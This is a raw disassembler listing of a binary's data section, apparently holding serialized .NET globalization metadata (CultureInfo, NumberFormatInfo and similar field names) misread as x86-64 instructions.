  40b6a7:	76 61                	jbe    0x40b70a
  40b6a9:	6c                   	insb   (%dx),(%rdi)
  40b6aa:	75 65                	jne    0x40b711
  40b6ac:	5f                   	pop    %rdi
  40b6ad:	5f                   	pop    %rdi
  40b6ae:	00 08                	add    %cl,(%rax)
  40b6b0:	02 00                	add    (%rax),%al
  40b6b2:	00 00                	add    %al,(%rax)
  40b6b4:	00 60 00             	add    %ah,0x0(%rax)
  40b6b7:	00 0b                	add    %cl,(%rbx)
  40b6b9:	02 00                	add    (%rax),%al
  40b6bb:	42 00 01             	rex.X add %al,(%rcx)
  40b6be:	00 00                	add    %al,(%rax)
  40b6c0:	00 ff                	add    %bh,%bh
  40b6c2:	ff                   	(bad)
  40b6c3:	ff                   	(bad)
  40b6c4:	ff 01                	incl   (%rcx)
  40b6c6:	00 00                	add    %al,(%rax)
  40b6c8:	00 00                	add    %al,(%rax)
  40b6ca:	00 00                	add    %al,(%rax)
  40b6cc:	00 04 01             	add    %al,(%rcx,%rax,1)
  40b6cf:	00 00                	add    %al,(%rax)
  40b6d1:	00 20                	add    %ah,(%rax)
  40b6d3:	53                   	push   %rbx
  40b6d4:	79 73                	jns    0x40b749
  40b6d6:	74 65                	je     0x40b73d
  40b6d8:	6d                   	insl   (%dx),(%rdi)
  40b6d9:	2e 47 6c             	cs rex.RXB insb (%dx),(%rdi)
  40b6dc:	6f                   	outsl  (%rsi),(%dx)
  40b6dd:	62 61 6c 69 7a       	(bad)
  40b6e2:	61                   	(bad)
  40b6e3:	74 69                	je     0x40b74e
  40b6e5:	6f                   	outsl  (%rsi),(%dx)
  40b6e6:	6e                   	outsb  (%rsi),(%dx)
  40b6e7:	2e 43 75 6c          	rex.XB jne,pn 0x40b757
  40b6eb:	74 75                	je     0x40b762
  40b6ed:	72 65                	jb     0x40b754
  40b6ef:	49 6e                	rex.WB outsb (%rsi),(%dx)
  40b6f1:	66 6f                	outsw  (%rsi),(%dx)
  40b6f3:	0a 00                	or     (%rax),%al
  40b6f5:	00 00                	add    %al,(%rax)
  40b6f7:	0c 6d                	or     $0x6d,%al
  40b6f9:	5f                   	pop    %rdi
  40b6fa:	69 73 52 65 61 64 4f 	imul   $0x4f646165,0x52(%rbx),%esi
  40b701:	6e                   	outsb  (%rsi),(%dx)
  40b702:	6c                   	insb   (%dx),(%rdi)
  40b703:	79 0b                	jns    0x40b710
  40b705:	63 6f 6d             	movsxd 0x6d(%rdi),%ebp
  40b708:	70 61                	jo     0x40b76b
  40b70a:	72 65                	jb     0x40b771
  40b70c:	49 6e                	rex.WB outsb (%rsi),(%dx)
  40b70e:	66 6f                	outsw  (%rsi),(%dx)
  40b710:	08 74 65 78          	or     %dh,0x78(%rbp,%riz,2)
  40b714:	74 49                	je     0x40b75f
  40b716:	6e                   	outsb  (%rsi),(%dx)
  40b717:	66 6f                	outsw  (%rsi),(%dx)
  40b719:	07                   	(bad)
  40b71a:	6e                   	outsb  (%rsi),(%dx)
  40b71b:	75 6d                	jne    0x40b78a
  40b71d:	49 6e                	rex.WB outsb (%rsi),(%dx)
  40b71f:	66 6f                	outsw  (%rsi),(%dx)
  40b721:	0c 64                	or     $0x64,%al
  40b723:	61                   	(bad)
  40b724:	74 65                	je     0x40b78b
  40b726:	54                   	push   %rsp
  40b727:	69 6d 65 49 6e 66 6f 	imul   $0x6f666e49,0x65(%rbp),%ebp
  40b72e:	08 63 61             	or     %ah,0x61(%rbx)
  40b731:	6c                   	insb   (%dx),(%rdi)
  40b732:	65 6e                	outsb  %gs:(%rsi),(%dx)
  40b734:	64 61                	fs (bad)
  40b736:	72 0a                	jb     0x40b742
  40b738:	6d                   	insl   (%dx),(%rdi)
  40b739:	5f                   	pop    %rdi
  40b73a:	64 61                	fs (bad)
  40b73c:	74 61                	je     0x40b79f
  40b73e:	49 74 65             	rex.WB je 0x40b7a6
  40b741:	6d                   	insl   (%dx),(%rdi)
  40b742:	09 63 75             	or     %esp,0x75(%rbx)
  40b745:	6c                   	insb   (%dx),(%rdi)
  40b746:	74 75                	je     0x40b7bd
  40b748:	72 65                	jb     0x40b7af
  40b74a:	49                   	rex.WB
  40b74b:	44 06                	rex.R (bad)
  40b74d:	6d                   	insl   (%dx),(%rdi)
  40b74e:	5f                   	pop    %rdi
  40b74f:	6e                   	outsb  (%rsi),(%dx)
  40b750:	61                   	(bad)
  40b751:	6d                   	insl   (%dx),(%rdi)
  40b752:	65 11 6d 5f          	adc    %ebp,%gs:0x5f(%rbp)
  40b756:	75 73                	jne    0x40b7cb
  40b758:	65 55                	gs push %rbp
  40b75a:	73 65                	jae    0x40b7c1
  40b75c:	72 4f                	jb     0x40b7ad
  40b75e:	76 65                	jbe    0x40b7c5
  40b760:	72 72                	jb     0x40b7d4
  40b762:	69 64 65 00 03 03 03 	imul   $0x3030303,0x0(%rbp,%riz,2),%esp
  40b769:	03 
  40b76a:	03 00                	add    (%rax),%eax
  40b76c:	00 01                	add    %al,(%rcx)
  40b76e:	00 01                	add    %al,(%rcx)
  40b770:	20 53 79             	and    %dl,0x79(%rbx)
  40b773:	73 74                	jae    0x40b7e9
  40b775:	65 6d                	gs insl (%dx),(%rdi)
  40b777:	2e 47 6c             	cs rex.RXB insb (%dx),(%rdi)
  40b77a:	6f                   	outsl  (%rsi),(%dx)
  40b77b:	62 61 6c 69 7a       	(bad)
  40b780:	61                   	(bad)
  40b781:	74 69                	je     0x40b7ec
  40b783:	6f                   	outsl  (%rsi),(%dx)
  40b784:	6e                   	outsb  (%rsi),(%dx)
  40b785:	2e 43 6f             	cs rex.XB outsl (%rsi),(%dx)
  40b788:	6d                   	insl   (%dx),(%rdi)
  40b789:	70 61                	jo     0x40b7ec
  40b78b:	72 65                	jb     0x40b7f2
  40b78d:	49 6e                	rex.WB outsb (%rsi),(%dx)
  40b78f:	66 6f                	outsw  (%rsi),(%dx)
  40b791:	1d 53 79 73 74       	sbb    $0x74737953,%eax
  40b796:	65 6d                	gs insl (%dx),(%rdi)
  40b798:	2e 47 6c             	cs rex.RXB insb (%dx),(%rdi)
  40b79b:	6f                   	outsl  (%rsi),(%dx)
  40b79c:	62 61 6c 69 7a       	(bad)
  40b7a1:	61                   	(bad)
  40b7a2:	74 69                	je     0x40b80d
  40b7a4:	6f                   	outsl  (%rsi),(%dx)
  40b7a5:	6e                   	outsb  (%rsi),(%dx)
  40b7a6:	2e 54                	cs push %rsp
  40b7a8:	65 78 74             	gs js  0x40b81f
  40b7ab:	49 6e                	rex.WB outsb (%rsi),(%dx)
  40b7ad:	66 6f                	outsw  (%rsi),(%dx)
  40b7af:	25 53 79 73 74       	and    $0x74737953,%eax
  40b7b4:	65 6d                	gs insl (%dx),(%rdi)
  40b7b6:	2e 47 6c             	cs rex.RXB insb (%dx),(%rdi)
  40b7b9:	6f                   	outsl  (%rsi),(%dx)
  40b7ba:	62 61 6c 69 7a       	(bad)
  40b7bf:	61                   	(bad)
  40b7c0:	74 69                	je     0x40b82b
  40b7c2:	6f                   	outsl  (%rsi),(%dx)
  40b7c3:	6e                   	outsb  (%rsi),(%dx)
  40b7c4:	2e 4e 75 6d          	rex.WRX jne,pn 0x40b835
  40b7c8:	62 65 72 46 6f       	(bad)
  40b7cd:	72 6d                	jb     0x40b83c
  40b7cf:	61                   	(bad)
  40b7d0:	74 49                	je     0x40b81b
  40b7d2:	6e                   	outsb  (%rsi),(%dx)
  40b7d3:	66 6f                	outsw  (%rsi),(%dx)
  40b7d5:	27                   	(bad)
  40b7d6:	53                   	push   %rbx
  40b7d7:	79 73                	jns    0x40b84c
  40b7d9:	74 65                	je     0x40b840
  40b7db:	6d                   	insl   (%dx),(%rdi)
  40b7dc:	2e 47 6c             	cs rex.RXB insb (%dx),(%rdi)
  40b7df:	6f                   	outsl  (%rsi),(%dx)
  40b7e0:	62 61 6c 69 7a       	(bad)
  40b7e5:	61                   	(bad)
  40b7e6:	74 69                	je     0x40b851
  40b7e8:	6f                   	outsl  (%rsi),(%dx)
  40b7e9:	6e                   	outsb  (%rsi),(%dx)
  40b7ea:	2e 44 61             	cs rex.R (bad)
  40b7ed:	74 65                	je     0x40b854
  40b7ef:	54                   	push   %rsp
  40b7f0:	69 6d 65 46 6f 72 6d 	imul   $0x6d726f46,0x65(%rbp),%ebp
  40b7f7:	61                   	(bad)
  40b7f8:	74 49                	je     0x40b843
  40b7fa:	6e                   	outsb  (%rsi),(%dx)
  40b7fb:	66 6f                	outsw  (%rsi),(%dx)
  40b7fd:	1d 53 79 73 74       	sbb    $0x74737953,%eax
  40b802:	65 6d                	gs insl (%dx),(%rdi)
  40b804:	2e 47 6c             	cs rex.RXB insb (%dx),(%rdi)
  40b807:	6f                   	outsl  (%rsi),(%dx)
  40b808:	62 61 6c 69 7a       	(bad)
  40b80d:	61                   	(bad)
  40b80e:	74 69                	je     0x40b879
  40b810:	6f                   	outsl  (%rsi),(%dx)
  40b811:	6e                   	outsb  (%rsi),(%dx)
  40b812:	2e 43 61             	cs rex.XB (bad)
  40b815:	6c                   	insb   (%dx),(%rdi)
  40b816:	65 6e                	outsb  %gs:(%rsi),(%dx)
  40b818:	64 61                	fs (bad)
  40b81a:	72 08                	jb     0x40b824
  40b81c:	08 01                	or     %al,(%rcx)
  40b81e:	01 09                	add    %ecx,(%rcx)
  40b820:	02 00                	add    (%rax),%al
  40b822:	00 00                	add    %al,(%rax)
  40b824:	09 03                	or     %eax,(%rbx)
  40b826:	00 00                	add    %al,(%rax)
  40b828:	00 09                	add    %cl,(%rcx)
  40b82a:	04 00                	add    $0x0,%al
  40b82c:	00 00                	add    %al,(%rax)
  40b82e:	0a 0a                	or     (%rdx),%cl
  40b830:	00 00                	add    %al,(%rax)
  40b832:	00 00                	add    %al,(%rax)
  40b834:	7f 00                	jg     0x40b836
  40b836:	00 00                	add    %al,(%rax)
  40b838:	06                   	(bad)
  40b839:	05 00 00 00 00       	add    $0x0,%eax
  40b83e:	00 04 02             	add    %al,(%rdx,%rax,1)
  40b841:	00 00                	add    %al,(%rax)
  40b843:	00 20                	add    %ah,(%rax)
  40b845:	53                   	push   %rbx
  40b846:	79 73                	jns    0x40b8bb
  40b848:	74 65                	je     0x40b8af
  40b84a:	6d                   	insl   (%dx),(%rdi)
  40b84b:	2e 47 6c             	cs rex.RXB insb (%dx),(%rdi)
  40b84e:	6f                   	outsl  (%rsi),(%dx)
  40b84f:	62 61 6c 69 7a       	(bad)
  40b854:	61                   	(bad)
  40b855:	74 69                	je     0x40b8c0
  40b857:	6f                   	outsl  (%rsi),(%dx)
  40b858:	6e                   	outsb  (%rsi),(%dx)
  40b859:	2e 43 6f             	cs rex.XB outsl (%rsi),(%dx)
  40b85c:	6d                   	insl   (%dx),(%rdi)
  40b85d:	70 61                	jo     0x40b8c0
  40b85f:	72 65                	jb     0x40b8c6
  40b861:	49 6e                	rex.WB outsb (%rsi),(%dx)
  40b863:	66 6f                	outsw  (%rsi),(%dx)
  40b865:	04 00                	add    $0x0,%al
  40b867:	00 00                	add    %al,(%rax)
  40b869:	06                   	(bad)
  40b86a:	6d                   	insl   (%dx),(%rdi)
  40b86b:	5f                   	pop    %rdi
  40b86c:	6e                   	outsb  (%rsi),(%dx)
  40b86d:	61                   	(bad)
  40b86e:	6d                   	insl   (%dx),(%rdi)
  40b86f:	65 09 77 69          	or     %esi,%gs:0x69(%rdi)
  40b873:	6e                   	outsb  (%rsi),(%dx)
  40b874:	33 32                	xor    (%rdx),%esi
  40b876:	4c                   	rex.WR
  40b877:	43                   	rex.XB
  40b878:	49                   	rex.WB
  40b879:	44 07                	rex.R (bad)
  40b87b:	63 75 6c             	movsxd 0x6c(%rbp),%esi
  40b87e:	74 75                	je     0x40b8f5
  40b880:	72 65                	jb     0x40b8e7
  40b882:	0d 6d 5f 53 6f       	or     $0x6f535f6d,%eax
  40b887:	72 74                	jb     0x40b8fd
  40b889:	56                   	push   %rsi
  40b88a:	65 72 73             	gs jb  0x40b900
  40b88d:	69 6f 6e 01 00 00 03 	imul   $0x3000001,0x6e(%rdi),%ebp
  40b894:	08 08                	or     %cl,(%rax)
  40b896:	20 53 79             	and    %dl,0x79(%rbx)
  40b899:	73 74                	jae    0x40b90f
  40b89b:	65 6d                	gs insl (%dx),(%rdi)
  40b89d:	2e 47 6c             	cs rex.RXB insb (%dx),(%rdi)
  40b8a0:	6f                   	outsl  (%rsi),(%dx)
  40b8a1:	62 61 6c 69 7a       	(bad)
  40b8a6:	61                   	(bad)
  40b8a7:	74 69                	je     0x40b912
  40b8a9:	6f                   	outsl  (%rsi),(%dx)
  40b8aa:	6e                   	outsb  (%rsi),(%dx)
  40b8ab:	2e 53                	cs push %rbx
  40b8ad:	6f                   	outsl  (%rsi),(%dx)
  40b8ae:	72 74                	jb     0x40b924
  40b8b0:	56                   	push   %rsi
  40b8b1:	65 72 73             	gs jb  0x40b927
  40b8b4:	69 6f 6e 09 05 00 00 	imul   $0x509,0x6e(%rdi),%ebp
  40b8bb:	00 00                	add    %al,(%rax)
  40b8bd:	00 00                	add    %al,(%rax)
  40b8bf:	00 7f 00             	add    %bh,0x0(%rdi)
  40b8c2:	00 00                	add    %al,(%rax)
  40b8c4:	0a 04 03             	or     (%rbx,%rax,1),%al
  40b8c7:	00 00                	add    %al,(%rax)
  40b8c9:	00 1d 53 79 73 74    	add    %bl,0x74737953(%rip)        # 0x74b43222
  40b8cf:	65 6d                	gs insl (%dx),(%rdi)
  40b8d1:	2e 47 6c             	cs rex.RXB insb (%dx),(%rdi)
  40b8d4:	6f                   	outsl  (%rsi),(%dx)
  40b8d5:	62 61 6c 69 7a       	(bad)
  40b8da:	61                   	(bad)
  40b8db:	74 69                	je     0x40b946
  40b8dd:	6f                   	outsl  (%rsi),(%dx)
  40b8de:	6e                   	outsb  (%rsi),(%dx)
  40b8df:	2e 54                	cs push %rsp
  40b8e1:	65 78 74             	gs js  0x40b958
  40b8e4:	49 6e                	rex.WB outsb (%rsi),(%dx)
  40b8e6:	66 6f                	outsw  (%rsi),(%dx)
  40b8e8:	07                   	(bad)
  40b8e9:	00 00                	add    %al,(%rax)
  40b8eb:	00 0f                	add    %cl,(%rdi)
  40b8ed:	6d                   	insl   (%dx),(%rdi)
  40b8ee:	5f                   	pop    %rdi
  40b8ef:	6c                   	insb   (%dx),(%rdi)
  40b8f0:	69 73 74 53 65 70 61 	imul   $0x61706553,0x74(%rbx),%esi
  40b8f7:	72 61                	jb     0x40b95a
  40b8f9:	74 6f                	je     0x40b96a
  40b8fb:	72 0c                	jb     0x40b909
  40b8fd:	6d                   	insl   (%dx),(%rdi)
  40b8fe:	5f                   	pop    %rdi
  40b8ff:	69 73 52 65 61 64 4f 	imul   $0x4f646165,0x52(%rbx),%esi
  40b906:	6e                   	outsb  (%rsi),(%dx)
  40b907:	6c                   	insb   (%dx),(%rdi)
  40b908:	79 0d                	jns    0x40b917
  40b90a:	6d                   	insl   (%dx),(%rdi)
  40b90b:	5f                   	pop    %rdi
  40b90c:	63 75 6c             	movsxd 0x6c(%rbp),%esi
  40b90f:	74 75                	je     0x40b986
  40b911:	72 65                	jb     0x40b978
  40b913:	4e 61                	rex.WRX (bad)
  40b915:	6d                   	insl   (%dx),(%rdi)
  40b916:	65 11 63 75          	adc    %esp,%gs:0x75(%rbx)
  40b91a:	73 74                	jae    0x40b990
  40b91c:	6f                   	outsl  (%rsi),(%dx)
  40b91d:	6d                   	insl   (%dx),(%rdi)
  40b91e:	43 75 6c             	rex.XB jne 0x40b98d
  40b921:	74 75                	je     0x40b998
  40b923:	72 65                	jb     0x40b98a
  40b925:	4e 61                	rex.WRX (bad)
  40b927:	6d                   	insl   (%dx),(%rdi)
  40b928:	65 0b 6d 5f          	or     %gs:0x5f(%rbp),%ebp
  40b92c:	6e                   	outsb  (%rsi),(%dx)
  40b92d:	44 61                	rex.R (bad)
  40b92f:	74 61                	je     0x40b992
  40b931:	49 74 65             	rex.WB je 0x40b999
  40b934:	6d                   	insl   (%dx),(%rdi)
  40b935:	11 6d 5f             	adc    %ebp,0x5f(%rbp)
  40b938:	75 73                	jne    0x40b9ad
  40b93a:	65 55                	gs push %rbp
  40b93c:	73 65                	jae    0x40b9a3
  40b93e:	72 4f                	jb     0x40b98f
  40b940:	76 65                	jbe    0x40b9a7
  40b942:	72 72                	jb     0x40b9b6
  40b944:	69 64 65 0d 6d 5f 77 	imul   $0x69775f6d,0xd(%rbp,%riz,2),%esp
  40b94b:	69 
  40b94c:	6e                   	outsb  (%rsi),(%dx)
  40b94d:	33 32                	xor    (%rdx),%esi
  40b94f:	4c 61                	rex.WR (bad)
  40b951:	6e                   	outsb  (%rsi),(%dx)
  40b952:	67 49                	addr32 rex.WB
  40b954:	44 01 00             	add    %r8d,(%rax)
  40b957:	01 01                	add    %eax,(%rcx)
  40b959:	00 00                	add    %al,(%rax)
  40b95b:	00 01                	add    %al,(%rcx)
  40b95d:	08 01                	or     %al,(%rcx)
  40b95f:	08 06                	or     %al,(%rsi)
  40b961:	06                   	(bad)
  40b962:	00 00                	add    %al,(%rax)
  40b964:	00 01                	add    %al,(%rcx)
  40b966:	2c 01                	sub    $0x1,%al
  40b968:	09 05 00 00 00 09    	or     %eax,0x9000000(%rip)        # 0x940b96e
  40b96e:	05 00 00 00 00       	add    $0x0,%eax
  40b973:	00 00                	add    %al,(%rax)
  40b975:	00 00                	add    %al,(%rax)
  40b977:	7f 00                	jg     0x40b979
  40b979:	00 00                	add    %al,(%rax)
  40b97b:	04 04                	add    $0x4,%al
  40b97d:	00 00                	add    %al,(%rax)
  40b97f:	00 25 53 79 73 74    	add    %ah,0x74737953(%rip)        # 0x74b432d8
  40b985:	65 6d                	gs insl (%dx),(%rdi)
  40b987:	2e 47 6c             	cs rex.RXB insb (%dx),(%rdi)
  40b98a:	6f                   	outsl  (%rsi),(%dx)
  40b98b:	62 61 6c 69 7a       	(bad)
  40b990:	61                   	(bad)
  40b991:	74 69                	je     0x40b9fc
  40b993:	6f                   	outsl  (%rsi),(%dx)
  40b994:	6e                   	outsb  (%rsi),(%dx)
  40b995:	2e 4e 75 6d          	rex.WRX jne,pn 0x40ba06
  40b999:	62 65 72 46 6f       	(bad)
  40b99e:	72 6d                	jb     0x40ba0d
  40b9a0:	61                   	(bad)
  40b9a1:	74 49                	je     0x40b9ec
  40b9a3:	6e                   	outsb  (%rsi),(%dx)
  40b9a4:	66 6f                	outsw  (%rsi),(%dx)
  40b9a6:	22 00                	and    (%rax),%al
  40b9a8:	00 00                	add    %al,(%rax)
  40b9aa:	10 6e 75             	adc    %ch,0x75(%rsi)
  40b9ad:	6d                   	insl   (%dx),(%rdi)
  40b9ae:	62 65 72 47 72       	(bad)
  40b9b3:	6f                   	outsl  (%rsi),(%dx)
  40b9b4:	75 70                	jne    0x40ba26
  40b9b6:	53                   	push   %rbx
  40b9b7:	69 7a 65 73 12 63 75 	imul   $0x75631273,0x65(%rdx),%edi
  40b9be:	72 72                	jb     0x40ba32
  40b9c0:	65 6e                	outsb  %gs:(%rsi),(%dx)
  40b9c2:	63 79 47             	movsxd 0x47(%rcx),%edi
  40b9c5:	72 6f                	jb     0x40ba36
  40b9c7:	75 70                	jne    0x40ba39
  40b9c9:	53                   	push   %rbx
  40b9ca:	69 7a 65 73 11 70 65 	imul   $0x65701173,0x65(%rdx),%edi
  40b9d1:	72 63                	jb     0x40ba36
  40b9d3:	65 6e                	outsb  %gs:(%rsi),(%dx)
  40b9d5:	74 47                	je     0x40ba1e
  40b9d7:	72 6f                	jb     0x40ba48
  40b9d9:	75 70                	jne    0x40ba4b
  40b9db:	53                   	push   %rbx
  40b9dc:	69 7a 65 73 0c 70 6f 	imul   $0x6f700c73,0x65(%rdx),%edi
  40b9e3:	73 69                	jae    0x40ba4e
  40b9e5:	74 69                	je     0x40ba50
  40b9e7:	76 65                	jbe    0x40ba4e
  40b9e9:	53                   	push   %rbx
  40b9ea:	69 67 6e 0c 6e 65 67 	imul   $0x67656e0c,0x6e(%rdi),%esp
  40b9f1:	61                   	(bad)
  40b9f2:	74 69                	je     0x40ba5d
  40b9f4:	76 65                	jbe    0x40ba5b
  40b9f6:	53                   	push   %rbx
  40b9f7:	69 67 6e 16 6e 75 6d 	imul   $0x6d756e16,0x6e(%rdi),%esp
  40b9fe:	62 65 72 44 65       	(bad)
  40ba03:	63 69 6d             	movsxd 0x6d(%rcx),%ebp
  40ba06:	61                   	(bad)
  40ba07:	6c                   	insb   (%dx),(%rdi)
  40ba08:	53                   	push   %rbx
  40ba09:	65 70 61             	gs jo  0x40ba6d
  40ba0c:	72 61                	jb     0x40ba6f
  40ba0e:	74 6f                	je     0x40ba7f
  40ba10:	72 14                	jb     0x40ba26
  40ba12:	6e                   	outsb  (%rsi),(%dx)
  40ba13:	75 6d                	jne    0x40ba82
  40ba15:	62 65 72 47 72       	(bad)
  40ba1a:	6f                   	outsl  (%rsi),(%dx)
  40ba1b:	75 70                	jne    0x40ba8d
  40ba1d:	53                   	push   %rbx
  40ba1e:	65 70 61             	gs jo  0x40ba82
  40ba21:	72 61                	jb     0x40ba84
  40ba23:	74 6f                	je     0x40ba94
  40ba25:	72 16                	jb     0x40ba3d
  40ba27:	63 75 72             	movsxd 0x72(%rbp),%esi
  40ba2a:	72 65                	jb     0x40ba91
  40ba2c:	6e                   	outsb  (%rsi),(%dx)
  40ba2d:	63 79 47             	movsxd 0x47(%rcx),%edi
  40ba30:	72 6f                	jb     0x40baa1
  40ba32:	75 70                	jne    0x40baa4
  40ba34:	53                   	push   %rbx
  40ba35:	65 70 61             	gs jo  0x40ba99
  40ba38:	72 61                	jb     0x40ba9b
  40ba3a:	74 6f                	je     0x40baab
  40ba3c:	72 18                	jb     0x40ba56
  40ba3e:	63 75 72             	movsxd 0x72(%rbp),%esi
  40ba41:	72 65                	jb     0x40baa8
  40ba43:	6e                   	outsb  (%rsi),(%dx)
  40ba44:	63 79 44             	movsxd 0x44(%rcx),%edi
  40ba47:	65 63 69 6d          	movsxd %gs:0x6d(%rcx),%ebp
  40ba4b:	61                   	(bad)
  40ba4c:	6c                   	insb   (%dx),(%rdi)
  40ba4d:	53                   	push   %rbx
  40ba4e:	65 70 61             	gs jo  0x40bab2
  40ba51:	72 61                	jb     0x40bab4
  40ba53:	74 6f                	je     0x40bac4
  40ba55:	72 0e                	jb     0x40ba65
  40ba57:	63 75 72             	movsxd 0x72(%rbp),%esi
  40ba5a:	72 65                	jb     0x40bac1
  40ba5c:	6e                   	outsb  (%rsi),(%dx)
  40ba5d:	63 79 53             	movsxd 0x53(%rcx),%edi
  40ba60:	79 6d                	jns    0x40bacf
  40ba62:	62 6f 6c 12 61       	(bad)
  40ba67:	6e                   	outsb  (%rsi),(%dx)
  40ba68:	73 69                	jae    0x40bad3
  40ba6a:	43 75 72             	rex.XB jne 0x40badf
  40ba6d:	72 65                	jb     0x40bad4
  40ba6f:	6e                   	outsb  (%rsi),(%dx)
  40ba70:	63 79 53             	movsxd 0x53(%rcx),%edi
  40ba73:	79 6d                	jns    0x40bae2
  40ba75:	62 6f 6c 09 6e       	(bad)
  40ba7a:	61                   	(bad)
  40ba7b:	6e                   	outsb  (%rsi),(%dx)
  40ba7c:	53                   	push   %rbx
  40ba7d:	79 6d                	jns    0x40baec
  40ba7f:	62 6f 6c 16 70       	(bad)
  40ba84:	6f                   	outsl  (%rsi),(%dx)
  40ba85:	73 69                	jae    0x40baf0
  40ba87:	74 69                	je     0x40baf2
  40ba89:	76 65                	jbe    0x40baf0
  40ba8b:	49 6e                	rex.WB outsb (%rsi),(%dx)
  40ba8d:	66 69 6e 69 74 79    	imul   $0x7974,0x69(%rsi),%bp
  40ba93:	53                   	push   %rbx
  40ba94:	79 6d                	jns    0x40bb03
  40ba96:	62 6f 6c 16 6e       	(bad)
  40ba9b:	65 67 61             	gs addr32 (bad)
  40ba9e:	74 69                	je     0x40bb09
  40baa0:	76 65                	jbe    0x40bb07
  40baa2:	49 6e                	rex.WB outsb (%rsi),(%dx)
  40baa4:	66 69 6e 69 74 79    	imul   $0x7974,0x69(%rsi),%bp
  40baaa:	53                   	push   %rbx
  40baab:	79 6d                	jns    0x40bb1a
  40baad:	62 6f 6c 17 70       	(bad)
  40bab2:	65 72 63             	gs jb  0x40bb18
  40bab5:	65 6e                	outsb  %gs:(%rsi),(%dx)
  40bab7:	74 44                	je     0x40bafd
  40bab9:	65 63 69 6d          	movsxd %gs:0x6d(%rcx),%ebp
  40babd:	61                   	(bad)
  40babe:	6c                   	insb   (%dx),(%rdi)
  40babf:	53                   	push   %rbx
  40bac0:	65 70 61             	gs jo  0x40bb24
  40bac3:	72 61                	jb     0x40bb26
  40bac5:	74 6f                	je     0x40bb36
  40bac7:	72 15                	jb     0x40bade
  40bac9:	70 65                	jo     0x40bb30
  40bacb:	72 63                	jb     0x40bb30
  40bacd:	65 6e                	outsb  %gs:(%rsi),(%dx)
  40bacf:	74 47                	je     0x40bb18
  40bad1:	72 6f                	jb     0x40bb42
  40bad3:	75 70                	jne    0x40bb45
  40bad5:	53                   	push   %rbx
  40bad6:	65 70 61             	gs jo  0x40bb3a
  40bad9:	72 61                	jb     0x40bb3c
  40badb:	74 6f                	je     0x40bb4c
  40badd:	72 0d                	jb     0x40baec
  40badf:	70 65                	jo     0x40bb46
  40bae1:	72 63                	jb     0x40bb46
  40bae3:	65 6e                	outsb  %gs:(%rsi),(%dx)
  40bae5:	74 53                	je     0x40bb3a
  40bae7:	79 6d                	jns    0x40bb56
  40bae9:	62 6f 6c 0e 70       	(bad)
  40baee:	65 72 4d             	gs jb  0x40bb3e
  40baf1:	69 6c 6c 65 53 79 6d 	imul   $0x626d7953,0x65(%rsp,%rbp,2),%ebp
  40baf8:	62 
  40baf9:	6f                   	outsl  (%rsi),(%dx)
  40bafa:	6c                   	insb   (%dx),(%rdi)
  40bafb:	0c 6e                	or     $0x6e,%al
  40bafd:	61                   	(bad)
  40bafe:	74 69                	je     0x40bb69
  40bb00:	76 65                	jbe    0x40bb67
  40bb02:	44 69 67 69 74 73 0a 	imul   $0x6d0a7374,0x69(%rdi),%r12d
  40bb09:	6d 
  40bb0a:	5f                   	pop    %rdi
  40bb0b:	64 61                	fs (bad)
  40bb0d:	74 61                	je     0x40bb70
  40bb0f:	49 74 65             	rex.WB je 0x40bb77
  40bb12:	6d                   	insl   (%dx),(%rdi)
  40bb13:	13 6e 75             	adc    0x75(%rsi),%ebp
  40bb16:	6d                   	insl   (%dx),(%rdi)
  40bb17:	62 65 72 44 65       	(bad)
  40bb1c:	63 69 6d             	movsxd 0x6d(%rcx),%ebp
  40bb1f:	61                   	(bad)
  40bb20:	6c                   	insb   (%dx),(%rdi)
  40bb21:	44 69 67 69 74 73 15 	imul   $0x63157374,0x69(%rdi),%r12d
  40bb28:	63 
  40bb29:	75 72                	jne    0x40bb9d
  40bb2b:	72 65                	jb     0x40bb92
  40bb2d:	6e                   	outsb  (%rsi),(%dx)
  40bb2e:	63 79 44             	movsxd 0x44(%rcx),%edi
  40bb31:	65 63 69 6d          	movsxd %gs:0x6d(%rcx),%ebp
  40bb35:	61                   	(bad)
  40bb36:	6c                   	insb   (%dx),(%rdi)
  40bb37:	44 69 67 69 74 73 17 	imul   $0x63177374,0x69(%rdi),%r12d
  40bb3e:	63 
  40bb3f:	75 72                	jne    0x40bbb3
  40bb41:	72 65                	jb     0x40bba8
  40bb43:	6e                   	outsb  (%rsi),(%dx)
  40bb44:	63 79 50             	movsxd 0x50(%rcx),%edi
  40bb47:	6f                   	outsl  (%rsi),(%dx)
  40bb48:	73 69                	jae    0x40bbb3
  40bb4a:	74 69                	je     0x40bbb5
  40bb4c:	76 65                	jbe    0x40bbb3
  40bb4e:	50                   	push   %rax
  40bb4f:	61                   	(bad)
  40bb50:	74 74                	je     0x40bbc6
  40bb52:	65 72 6e             	gs jb  0x40bbc3
  40bb55:	17                   	(bad)
  40bb56:	63 75 72             	movsxd 0x72(%rbp),%esi
  40bb59:	72 65                	jb     0x40bbc0
  40bb5b:	6e                   	outsb  (%rsi),(%dx)
  40bb5c:	63 79 4e             	movsxd 0x4e(%rcx),%edi
  40bb5f:	65 67 61             	gs addr32 (bad)
  40bb62:	74 69                	je     0x40bbcd
  40bb64:	76 65                	jbe    0x40bbcb
  40bb66:	50                   	push   %rax
  40bb67:	61                   	(bad)
  40bb68:	74 74                	je     0x40bbde
  40bb6a:	65 72 6e             	gs jb  0x40bbdb
  40bb6d:	15 6e 75 6d 62       	adc    $0x626d756e,%eax
  40bb72:	65 72 4e             	gs jb  0x40bbc3
  40bb75:	65 67 61             	gs addr32 (bad)
  40bb78:	74 69                	je     0x40bbe3
  40bb7a:	76 65                	jbe    0x40bbe1
  40bb7c:	50                   	push   %rax
  40bb7d:	61                   	(bad)
  40bb7e:	74 74                	je     0x40bbf4
  40bb80:	65 72 6e             	gs jb  0x40bbf1
  40bb83:	16                   	(bad)
  40bb84:	70 65                	jo     0x40bbeb
  40bb86:	72 63                	jb     0x40bbeb
  40bb88:	65 6e                	outsb  %gs:(%rsi),(%dx)
  40bb8a:	74 50                	je     0x40bbdc
  40bb8c:	6f                   	outsl  (%rsi),(%dx)
  40bb8d:	73 69                	jae    0x40bbf8
  40bb8f:	74 69                	je     0x40bbfa
  40bb91:	76 65                	jbe    0x40bbf8
  40bb93:	50                   	push   %rax
  40bb94:	61                   	(bad)
  40bb95:	74 74                	je     0x40bc0b
  40bb97:	65 72 6e             	gs jb  0x40bc08
  40bb9a:	16                   	(bad)
  40bb9b:	70 65                	jo     0x40bc02
  40bb9d:	72 63                	jb     0x40bc02
  40bb9f:	65 6e                	outsb  %gs:(%rsi),(%dx)
  40bba1:	74 4e                	je     0x40bbf1
  40bba3:	65 67 61             	gs addr32 (bad)
